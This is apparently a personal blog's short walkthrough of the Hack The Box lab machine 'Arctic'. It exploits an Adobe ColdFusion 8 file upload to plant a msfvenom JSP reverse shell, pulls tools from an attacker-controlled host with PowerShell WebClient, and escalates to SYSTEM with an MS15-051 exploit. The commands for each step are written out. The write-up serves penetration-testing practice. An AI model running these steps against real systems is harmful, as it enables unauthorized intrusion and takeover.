<html>
<head>
	<title>- TLDR - HTB: Arctic</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/CSS/blog.css">
	<link rel="stylesheet" href="/CSS/global.css">
</head>
<body class="noselect">
	<h1 id="title" class="blog_title">
		<a href="/index.html" class="homelink">
			HTB: Arctic<br><a href="/Blogs/TLDR/index.html"><span id="tldr">- TLDR -</span></a>
		</a>
	</h1>
	<div id="big_wrapper" class="wordwrap">
		<div class="paragraph">
			<div id="menu">
				<a href="/index.html" class="menu_item">Home</a>
				<a href="/Blogs/HTB_Arctic/htb_arctic.html" class="menu_item">FULL</a>
				<a href="/Blogs/TLDR/index.html" class="menu_item">All TLDRs</a>
				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
				<hr>
			</div>
		</div>

<div class="paragraph">
	<p None class="subtitle">Intro:</p>
<p class="content">This was a decent box that just takes a bit of patience. It uses a couple of CVEs to get both user and root. The greatest nuissance of this box is that the website takes 30 seconds to load a page, so lots of patience is required</p>
</div>
<div class="paragraph">
	<p None class="subtitle">Recon:</p>
<p class="content"><span class="code">nmap -sT -sV -A -v &lt;target ip&gt;</span> reveals ports 135, 8500, and 49154. 135 is the default port for MSRPC Endpoint Mapper, which reveals what services are mapped to which port. Using impacket's "rpcdump.py", we can see that port 49154 is associated with Task Scheduler. This indicates that we might be able to do some RCE. Nmap shows that port 8500 is ftmp, but doing some googling shows that is could also be the default webserver for Adobe ColdFusion. Navigating to the page shows that the latter is the case.</p>
</div>
<div class="paragraph">
	<p None class="subtitle">Getting User:</p>
<p class="content">Checking Exploit DB reveals that Adobe ColdFusion 8 (our version) is vulnerable to an Arbitrary File Upload attack. There is a metasploit module that we can use as framework for our custom attack <a href="#ref_1" class="link">[1]</a>.</p>
<p class="content">The attack works by sending a POST request to a specific file on the server, pretending to upload a text file. We really upload a reverse shell jsp file, generated using msfvenom: <span class="code">msfvenom -p windows/x64/shell_reverse_tcp -f jsp LHOST=&lt;your ip&gt; LPORT=3184 &gt; cmd.jsp</span>. Upload the shell, start a netcat listener, then navigate to the uploaded file which is located at "http://<target ip>:8500/userfiles/file/cmd.jsp". We get a connection which allows us to get the user flag: <span class="code">type C:\Users\tolis\Desktop\user.txt</span>.</p>
</div>
<div class="paragraph">
	<p None class="subtitle">Upgrading to a PowerShell:</p>
<p class="content">I didn't manage to successfully upload a reverse powershell, so instead we need to manually connect back with a new reverse powershell. To upgrade to a powershell, we can run a reverse powershell oneliner in the current shell: <span class="code">powershell -Command '&lt;powershell one-liner&gt;'</span> <a href="#ref_2" class="link">[2]</a>.</p>
</div>
<div class="paragraph">
	<p None class="subtitle">Getting Root:</p>
<p class="content">We can enumerate kernel vulnerabilities using Sherlock <a href="#ref_3" class="link">[3]</a>. To upload the file, the most successful way is to create a webclient object and download the file through that: <span class="code_block"><br>$WebClient=New-Object System.Net.WebClient<br>
$WebClient.DownloadFile("http://&lt;your ip&gt;/Sherlock.ps1", "C:\Users\tolis\AppData\Local\Temp\s.ps1")<br>
Import-Module .\s.ps1<br>
Find-AllVulns</span><br>The final command will reveal all the potential vulnerabilities the system is affected by. In our case, we will attack MS15-051.</p>
<p class="content">We can download an exploit from SecWiki <a href="#ref_4" class="link">[4]</a> and upload it using the WebClient object we made (I uploaded it as "ms.exe"). Once it's been uploaded, we can confirm it works through: <span class="code">.\ms.exe "whoami"</span>, which will return <span class="code">nt authority/system</span>. To get a root shell, we upload a reverse shell exe generated using msfvenom. Finally, start a netcat listener and run the reverse shell using the exploit: <span class="code">.\ms.exe .\rshl.exe</span>. Get the root flag: <span class="code">type C:\Users\Administrator\Desktop\root.txt</span></p>
</div>
<br><br><br><div class="paragraph res_list">
	<p class="subtitle">Resources:</p>
<p class="content"><a id="ref_1" href="/Blogs/resources.html#custom_htb_arctic_afu.py" class="menu_item">Adobe ColdFusion 8 AFU</a></p><br>
<p class="content"><a id="ref_2" href="/Blogs/resources.html#rshell_powershell_oneliner_generic" class="menu_item">PowerShell One-Liner</a></p><br>
<p class="content"><a id="ref_3" href="/Blogs/resources.html#privesc_sherlock" class="menu_item">Sherlock PowerShell Script</a></p><br>
<p class="content"><a id="ref_4" href="https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip" class="menu_item" target="_blank">SecWiki MS15-051</a>&nbsp<b>[EXTERNAL]</b></p><br>
</div>
		<br>
		<div class="paragraph">
			<hr>
			<p class="content">Last edit: 2021.09.04</p>
		</div>
	</div>
</body>
<footer>
	<script type="text/javascript" src="/JS/blog.js"></script>
</footer>
</html>